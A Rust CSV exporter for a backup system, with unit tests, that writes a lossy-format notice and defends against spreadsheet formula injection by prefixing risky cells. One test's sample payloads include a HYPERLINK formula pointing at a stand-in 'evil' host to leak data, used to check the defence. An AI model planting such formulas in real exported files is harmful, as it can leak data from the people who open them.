//! CSV exporter — flattened core columns. Explicitly lossy.
//!
//! Mirrors `src/dbs/export/csv.py` in baileyrd/Daily-Backup-System
//! (pinned `@6cc6491`). CSV cannot faithfully represent nested raw
//! payloads, so this format is *not* restore-grade. The first physical
//! line is a `#` comment saying so; the second line is the real header.
//! `raw` is emitted as a JSON-encoded string column only when
//! `include_raw` is set.

use std::io::Write;

use serde_json::Value;

use crate::errors::DbsError;
use crate::storage::{ExportQuery, ItemRow};

use super::{ExportResult, ExportSource, Exporter};

const BASE_COLUMNS: &[&str] = &[
    "source",
    "type",
    "external_id",
    "item_kind",
    "title",
    "url",
    "body",
    "tags",
    "created_at",
    "updated_at",
    "revision",
    "deleted",
    "deleted_at",
    "content_hash",
];

const LOSSY_NOTE: &[u8] =
    b"# NOTE: CSV is a flattened, LOSSY view and is not restore-grade. Use ndjson or archive for a faithful backup.\n";

pub struct CsvExporter;

impl Exporter for CsvExporter {
    fn format(&self) -> &'static str {
        "csv"
    }

    fn media_type(&self) -> &'static str {
        "text/csv"
    }

    fn file_ext(&self) -> &'static str {
        ".csv"
    }

    fn write(
        &self,
        source: &dyn ExportSource,
        out: &mut dyn Write,
        query: &ExportQuery,
    ) -> Result<ExportResult, DbsError> {
        let mut columns: Vec<&str> = BASE_COLUMNS.to_vec();
        if query.include_raw {
            columns.push("raw");
        }

        out.write_all(LOSSY_NOTE)
            .map_err(|e| DbsError::Storage(format!("failed to write export: {e}")))?;

        let mut writer = ::csv::WriterBuilder::new().from_writer(out);
        writer.write_record(&columns).map_err(csv_err)?;

        let mut count: u64 = 0;
        for row in source.items() {
            let record: Vec<String> = columns
                .iter()
                .map(|col| cell(&row, col, query.include_raw))
                .collect();
            writer.write_record(&record).map_err(csv_err)?;
            count += 1;
        }
        writer.flush().map_err(|e| csv_err(e.into()))?;

        Ok(ExportResult {
            format: self.format().to_string(),
            item_count: count,
            ..Default::default()
        })
    }
}

fn cell(row: &ItemRow, column: &str, include_raw: bool) -> String {
    match column {
        "tags" => match row.get("tags").and_then(|v| v.as_array()) {
            Some(tags) => tags
                .iter()
                .map(value_to_cell_owned)
                .collect::<Vec<_>>()
                .join(", "),
            None => String::new(),
        },
        "deleted" => {
            let deleted = row
                .get("deleted")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            if deleted {
                "1".to_string()
            } else {
                "0".to_string()
            }
        }
        "raw" if include_raw => match row.get("raw") {
            Some(v) => serde_json::to_string(v).unwrap_or_default(),
            None => "null".to_string(),
        },
        other => value_to_cell(row.get(other)),
    }
}

fn value_to_cell(value: Option<&Value>) -> String {
    let text = match value {
        None | Some(Value::Null) => String::new(),
        Some(Value::String(s)) => s.clone(),
        Some(other) => other.to_string(),
    };
    neutralize_formula_trigger(text)
}

fn value_to_cell_owned(value: &Value) -> String {
    let text = match value {
        Value::String(s) => s.clone(),
        other => other.to_string(),
    };
    neutralize_formula_trigger(text)
}

/// Neutralizes a spreadsheet-formula trigger (CWE-1236). Excel/Sheets/
/// LibreOffice interpret a cell whose content begins with `=`, `+`, `-`,
/// or `@` as a formula, regardless of the CSV writer's own delimiter
/// quoting (which only escapes commas/quotes, not formula semantics).
/// Item content here is externally-sourced (post bodies, titles, tags
/// from whatever service backed it up) and not trusted, so every cell
/// value is checked before being written — prefixing a leading `'`,
/// which every spreadsheet application treats as "force text", defeats
/// formula evaluation while leaving the visible content unchanged.
fn neutralize_formula_trigger(mut s: String) -> String {
    if s.starts_with(['=', '+', '-', '@']) {
        s.insert(0, '\'');
    }
    s
}

fn csv_err(e: ::csv::Error) -> DbsError {
    DbsError::Storage(format!("failed to write export: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    struct FakeSource {
        items: Vec<ItemRow>,
    }

    impl ExportSource for FakeSource {
        fn items(&self) -> Box<dyn Iterator<Item = ItemRow> + '_> {
            Box::new(self.items.iter().cloned())
        }
        fn revisions(&self) -> Box<dyn Iterator<Item = ItemRow> + '_> {
            Box::new(std::iter::empty())
        }
        fn media_blobs(&self) -> Box<dyn Iterator<Item = ItemRow> + '_> {
            Box::new(std::iter::empty())
        }
        fn manifest(&self) -> ItemRow {
            ItemRow::new()
        }
    }

    fn row(external_id: &str) -> ItemRow {
        let mut r = ItemRow::new();
        r.insert("external_id".to_string(), Value::from(external_id));
        r
    }

    fn write_to_string(source: &FakeSource, query: &ExportQuery) -> (String, ExportResult) {
        let mut out: Vec<u8> = Vec::new();
        let result = CsvExporter.write(source, &mut out, query).unwrap();
        (String::from_utf8(out).unwrap(), result)
    }

    #[test]
    fn empty_result_set_writes_header_and_comment_only() {
        let source = FakeSource { items: Vec::new() };
        let (text, result) = write_to_string(&source, &ExportQuery::default());
        let mut lines = text.lines();
        assert!(lines.next().unwrap().starts_with("# NOTE:"));
        let header = lines.next().unwrap();
        assert!(header.starts_with("source,type,external_id"));
        assert!(header.contains("raw"));
        assert_eq!(lines.next(), None);
        assert_eq!(result.item_count, 0);
        assert_eq!(result.format, "csv");
        assert_eq!(result.bytes_written, 0);
    }

    #[test]
    fn single_item_is_one_data_row() {
        let source = FakeSource {
            items: vec![row("e1")],
        };
        let (text, result) = write_to_string(&source, &ExportQuery::default());
        assert_eq!(result.item_count, 1);
        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
        let headers = reader.headers().unwrap().clone();
        let record = reader.records().next().unwrap().unwrap();
        let idx = headers.iter().position(|h| h == "external_id").unwrap();
        assert_eq!(&record[idx], "e1");
    }

    #[test]
    fn values_needing_escaping_round_trip() {
        let mut r = row("e1");
        r.insert(
            "title".to_string(),
            Value::from("hello, \"world\"\nnewline"),
        );
        let source = FakeSource { items: vec![r] };
        let (text, _result) = write_to_string(&source, &ExportQuery::default());
        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
        let headers = reader.headers().unwrap().clone();
        let record = reader.records().next().unwrap().unwrap();
        let idx = headers.iter().position(|h| h == "title").unwrap();
        assert_eq!(&record[idx], "hello, \"world\"\nnewline");
    }

    #[test]
    fn tags_are_comma_joined_and_deleted_is_a_flag() {
        let mut r = row("e1");
        r.insert("tags".to_string(), json!(["a", "b", "c"]));
        r.insert("deleted".to_string(), Value::from(true));
        let source = FakeSource { items: vec![r] };
        let (text, _result) = write_to_string(&source, &ExportQuery::default());
        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
        let headers = reader.headers().unwrap().clone();
        let record = reader.records().next().unwrap().unwrap();
        let tags_idx = headers.iter().position(|h| h == "tags").unwrap();
        let deleted_idx = headers.iter().position(|h| h == "deleted").unwrap();
        assert_eq!(&record[tags_idx], "a, b, c");
        assert_eq!(&record[deleted_idx], "1");
    }

    #[test]
    fn a_title_starting_with_a_formula_trigger_is_neutralized() {
        for payload in [
            "=HYPERLINK(\"http://evil/leak\",\"x\")",
            "+1+1",
            "-2-2",
            "@SUM(1,1)",
        ] {
            let mut r = row("e1");
            r.insert("title".to_string(), Value::from(payload));
            let source = FakeSource { items: vec![r] };
            let (text, _result) = write_to_string(&source, &ExportQuery::default());
            let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
            let mut reader = ::csv::Reader::from_reader(body.as_bytes());
            let headers = reader.headers().unwrap().clone();
            let record = reader.records().next().unwrap().unwrap();
            let idx = headers.iter().position(|h| h == "title").unwrap();
            // The visible content survives (minus the neutralizing prefix)
            // but the cell no longer begins with a formula-trigger
            // character -- a spreadsheet application must never evaluate
            // it as a formula.
            assert_eq!(&record[idx], format!("'{payload}"));
            assert!(
                !record[idx].starts_with(['=', '+', '-', '@']),
                "{}",
                &record[idx]
            );
        }
    }

    #[test]
    fn a_title_not_starting_with_a_formula_trigger_is_unchanged() {
        let mut r = row("e1");
        r.insert("title".to_string(), Value::from("ordinary title"));
        let source = FakeSource { items: vec![r] };
        let (text, _result) = write_to_string(&source, &ExportQuery::default());
        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
        let headers = reader.headers().unwrap().clone();
        let record = reader.records().next().unwrap().unwrap();
        let idx = headers.iter().position(|h| h == "title").unwrap();
        assert_eq!(&record[idx], "ordinary title");
    }

    #[test]
    fn raw_column_is_omitted_when_include_raw_is_false() {
        let source = FakeSource {
            items: vec![row("e1")],
        };
        let query = ExportQuery {
            include_raw: false,
            ..ExportQuery::default()
        };
        let (text, _result) = write_to_string(&source, &query);
        let header = text.lines().nth(1).unwrap();
        assert!(!header.split(',').any(|c| c == "raw"));
    }

    #[test]
    fn raw_column_is_json_encoded_when_include_raw_is_true() {
        let mut r = row("e1");
        r.insert("raw".to_string(), json!({"a": 1}));
        let source = FakeSource { items: vec![r] };
        let query = ExportQuery {
            include_raw: true,
            ..ExportQuery::default()
        };
        let (text, _result) = write_to_string(&source, &query);
        let body = text.lines().skip(1).collect::<Vec<_>>().join("\n");
        let mut reader = ::csv::Reader::from_reader(body.as_bytes());
        let headers = reader.headers().unwrap().clone();
        let record = reader.records().next().unwrap().unwrap();
        let idx = headers.iter().position(|h| h == "raw").unwrap();
        let parsed: Value = serde_json::from_str(&record[idx]).unwrap();
        assert_eq!(parsed, json!({"a": 1}));
    }

    #[test]
    fn exporter_metadata_matches_the_reference() {
        assert_eq!(CsvExporter.format(), "csv");
        assert_eq!(CsvExporter.media_type(), "text/csv");
        assert_eq!(CsvExporter.file_ext(), ".csv");
    }
}
